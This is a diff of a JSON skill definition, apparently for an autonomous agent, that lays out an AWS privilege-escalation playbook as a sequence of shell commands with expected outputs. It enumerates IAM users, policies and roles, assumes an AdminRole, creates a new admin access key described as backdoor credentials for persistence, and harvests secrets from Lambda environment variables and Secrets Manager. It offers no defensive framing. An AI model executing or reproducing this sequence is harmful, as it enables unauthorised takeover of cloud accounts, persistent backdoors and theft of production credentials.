@@ -2,37 +2,138 @@
   "name": "aws_privilege_escalation",
   "description": "AWS privilege escalation techniques and IAM exploitation",
   "pattern": "aws.*priv.*esc|iam.*exploit|aws.*lateral|role.*assume",
-  "parameters": ["access_key", "secret_key", "target_role"],
+  "parameters": [
+    "access_key",
+    "secret_key",
+    "target_role"
+  ],
   "sequence": [
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "aws", "args": ["iam", "get-user"]},
-      "expected_output": {"type": "string", "example": "{\n    \"User\": {\n        \"UserName\": \"compromised-user\",\n        \"UserId\": \"AIDAI23ABC456DEF789GH\",\n        \"Arn\": \"arn:aws:iam::123456789012:user/compromised-user\",\n        \"CreateDate\": \"2023-06-05T11:42:18Z\",\n        \"PasswordLastUsed\": \"2024-01-15T14:30:00Z\"\n    }\n}\n\nCurrent user context confirmed"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "aws",
+        "args": [
+          "iam",
+          "get-user"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "{\n    \"User\": {\n        \"UserName\": \"compromised-user\",\n        \"UserId\": \"AIDAI23ABC456DEF789GH\",\n        \"Arn\": \"arn:aws:iam::123456789012:user/compromised-user\",\n        \"CreateDate\": \"2023-06-05T11:42:18Z\",\n        \"PasswordLastUsed\": \"2024-01-15T14:30:00Z\"\n    }\n}\n\nCurrent user context confirmed"
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "aws", "args": ["iam", "list-attached-user-policies", "--user-name", "compromised-user"]},
-      "expected_output": {"type": "string", "example": "{\n    \"AttachedPolicies\": [\n        {\n            \"PolicyName\": \"IAMReadOnlyAccess\",\n            \"PolicyArn\": \"arn:aws:iam::aws:policy/IAMReadOnlyAccess\"\n        },\n        {\n            \"PolicyName\": \"AssumeRolePolicy\",\n            \"PolicyArn\": \"arn:aws:iam::123456789012:policy/AssumeRolePolicy\"\n        }\n    ]\n}\n\nPermissions: IAMReadOnlyAccess + AssumeRolePolicy\nCan assume roles! Escalation vector found."}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "aws",
+        "args": [
+          "iam",
+          "list-attached-user-policies",
+          "--user-name",
+          "compromised-user"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "{\n    \"AttachedPolicies\": [\n        {\n            \"PolicyName\": \"IAMReadOnlyAccess\",\n            \"PolicyArn\": \"arn:aws:iam::aws:policy/IAMReadOnlyAccess\"\n        },\n        {\n            \"PolicyName\": \"AssumeRolePolicy\",\n            \"PolicyArn\": \"arn:aws:iam::123456789012:policy/AssumeRolePolicy\"\n        }\n    ]\n}\n\nPermissions: IAMReadOnlyAccess + AssumeRolePolicy\nCan assume roles! Escalation vector found."
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "aws", "args": ["iam", "list-roles"]},
-      "expected_output": {"type": "string", "example": "{\n    \"Roles\": [\n        {\n            \"RoleName\": \"AdminRole\",\n            \"Arn\": \"arn:aws:iam::123456789012:role/AdminRole\",\n            \"AssumeRolePolicyDocument\": {...}\n        },\n        {\n            \"RoleName\": \"PowerUserRole\",\n            \"Arn\": \"arn:aws:iam::123456789012:role/PowerUserRole\"\n        }\n    ]\n}\n\nAdmin role discovered! Attempting assume role..."}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "aws",
+        "args": [
+          "iam",
+          "list-roles"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "{\n    \"Roles\": [\n        {\n            \"RoleName\": \"AdminRole\",\n            \"Arn\": \"arn:aws:iam::123456789012:role/AdminRole\",\n            \"AssumeRolePolicyDocument\": {...}\n        },\n        {\n            \"RoleName\": \"PowerUserRole\",\n            \"Arn\": \"arn:aws:iam::123456789012:role/PowerUserRole\"\n        }\n    ]\n}\n\nAdmin role discovered! Attempting assume role..."
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "aws", "args": ["sts", "assume-role", "--role-arn", "arn:aws:iam::123456789012:role/AdminRole", "--role-session-name", "escalated-session"]},
-      "expected_output": {"type": "string", "example": "{\n    \"Credentials\": {\n        \"AccessKeyId\": \"ASIAIOSFODNN7EXAMPLE\",\n        \"SecretAccessKey\": \"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\",\n        \"SessionToken\": \"AQoDYXdzEJr...\",\n        \"Expiration\": \"2024-01-15T20:30:00Z\"\n    }\n}\n\nPrivilege escalation successful!\nAdmin role assumed. Export credentials:\nexport AWS_ACCESS_KEY_ID=ASIAIOSFODNN7EXAMPLE\nexport AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\nexport AWS_SESSION_TOKEN=AQoDYXdzEJr..."}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "aws",
+        "args": [
+          "sts",
+          "assume-role",
+          "--role-arn",
+          "arn:aws:iam::123456789012:role/AdminRole",
+          "--role-session-name",
+          "escalated-session"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "{\n    \"Credentials\": {\n        \"AccessKeyId\": \"ASIAIOSFODNN7EXAMPLE\",\n        \"SecretAccessKey\": \"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\",\n        \"SessionToken\": \"AQoDYXdzEJr...\",\n        \"Expiration\": \"2024-01-15T20:30:00Z\"\n    }\n}\n\nPrivilege escalation successful!\nAdmin role assumed. Export credentials:\nexport AWS_ACCESS_KEY_ID=ASIAIOSFODNN7EXAMPLE\nexport AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\nexport AWS_SESSION_TOKEN=AQoDYXdzEJr..."
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "aws", "args": ["iam", "create-access-key", "--user-name", "admin"]},
-      "expected_output": {"type": "string", "example": "{\n    \"AccessKey\": {\n        \"UserName\": \"admin\",\n        \"AccessKeyId\": \"AKIAI44QH8DHBEXAMPLE\",\n        \"SecretAccessKey\": \"je7MtGbClwBF/2Zp9Utk/h3yCo8nvbEXAMPLEKEY\",\n        \"Status\": \"Active\",\n        \"CreateDate\": \"2024-01-15T15:00:00Z\"\n    }\n}\n\nPersistence: New admin access key created!\nBackdoor credentials for future access."}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "aws",
+        "args": [
+          "iam",
+          "create-access-key",
+          "--user-name",
+          "admin"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "{\n    \"AccessKey\": {\n        \"UserName\": \"admin\",\n        \"AccessKeyId\": \"AKIAI44QH8DHBEXAMPLE\",\n        \"SecretAccessKey\": \"je7MtGbClwBF/2Zp9Utk/h3yCo8nvbEXAMPLEKEY\",\n        \"Status\": \"Active\",\n        \"CreateDate\": \"2024-01-15T15:00:00Z\"\n    }\n}\n\nPersistence: New admin access key created!\nBackdoor credentials for future access."
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "aws", "args": ["lambda", "list-functions"]},
-      "expected_output": {"type": "string", "example": "{\n    \"Functions\": [\n        {\n            \"FunctionName\": \"ProcessPayments\",\n            \"FunctionArn\": \"arn:aws:lambda:us-east-1:123456789012:function:ProcessPayments\",\n            \"Runtime\": \"python3.9\",\n            \"Role\": \"arn:aws:iam::123456789012:role/LambdaAdminRole\",\n            \"Environment\": {\"Variables\": {\"DB_PASSWORD\": \"SecretPass123!\"}}\n        }\n    ]\n}\n\nLambda with hardcoded credentials found!\nDB_PASSWORD exposed in environment variables."}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "aws",
+        "args": [
+          "lambda",
+          "list-functions"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "{\n    \"Functions\": [\n        {\n            \"FunctionName\": \"ProcessPayments\",\n            \"FunctionArn\": \"arn:aws:lambda:us-east-1:123456789012:function:ProcessPayments\",\n            \"Runtime\": \"python3.9\",\n            \"Role\": \"arn:aws:iam::123456789012:role/LambdaAdminRole\",\n            \"Environment\": {\"Variables\": {\"DB_PASSWORD\": \"SecretPass123!\"}}\n        }\n    ]\n}\n\nLambda with hardcoded credentials found!\nDB_PASSWORD exposed in environment variables."
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "aws", "args": ["secretsmanager", "list-secrets"]},
-      "expected_output": {"type": "string", "example": "{\n    \"SecretList\": [\n        {\n            \"Name\": \"prod/database/master\",\n            \"ARN\": \"arn:aws:secretsmanager:us-east-1:123456789012:secret:prod/database/master-AbCdEf\"\n        },\n        {\n            \"Name\": \"api-keys/stripe\",\n            \"ARN\": \"arn:aws:secretsmanager:us-east-1:123456789012:secret:api-keys/stripe-XyZaBc\"\n        }\n    ]\n}\n\nSecrets Manager enumerated. Retrieving secrets:\naws secretsmanager get-secret-value --secret-id prod/database/master"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "aws",
+        "args": [
+          "secretsmanager",
+          "list-secrets"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "{\n    \"SecretList\": [\n        {\n            \"Name\": \"prod/database/master\",\n            \"ARN\": \"arn:aws:secretsmanager:us-east-1:123456789012:secret:prod/database/master-AbCdEf\"\n        },\n        {\n            \"Name\": \"api-keys/stripe\",\n            \"ARN\": \"arn:aws:secretsmanager:us-east-1:123456789012:secret:api-keys/stripe-XyZaBc\"\n        }\n    ]\n}\n\nSecrets Manager enumerated. Retrieving secrets:\naws secretsmanager get-secret-value --secret-id prod/database/master"
+      }
     }
   ],
-  "stats": {"uses": 0, "successes": 0, "failures": 0, "success_rate": 0.0},
+  "stats": {
+    "uses": 0,
+    "successes": 0,
+    "failures": 0,
+    "success_rate": 0.0
+  },
   "created_by": "neural_mesh_v5.2_generator"
 }
